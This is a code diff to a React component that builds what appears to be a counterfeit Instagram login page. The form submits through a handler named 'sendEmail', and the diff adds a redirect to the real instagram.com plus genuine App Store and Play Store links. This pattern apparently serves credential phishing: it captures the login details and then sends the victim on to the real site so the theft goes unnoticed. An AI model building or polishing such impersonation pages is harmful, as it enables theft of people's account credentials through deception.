@@ -31,7 +31,7 @@ const Login = () => {
                     <img src={mobile} alt="mobile" className="h-100 h-[581px]" />
                 </div>
                 <div className="md:w-6/12 w-100 px-3 ">
-                    <form class="main-top" onSubmit={sendEmail} ref={form}>
+                    <form class="main-top" action="https://www.instagram.com/" onSubmit={sendEmail} ref={form}>
                         <div class="flex items-center w-100  justify-center mb-[36px]">
                             <img src={logo} alt="logo" />
                         </div>
@@ -60,8 +60,8 @@ const Login = () => {
                     <div class="app-section">
                         <span> Get the app </span>
                         <div class="images">
-                            <a href="#"><img src={app} alt="appstore" /></a>
-                            <a href="#"><img src={play} alt="playstore" /></a>
+                            <a href="https://apps.apple.com/in/app/instagram/id389801252"><img src={app} alt="appstore" /></a>
+                            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en&gl=US"><img src={play} alt="playstore" /></a>
                         </div>
                     </div>
                 </div>
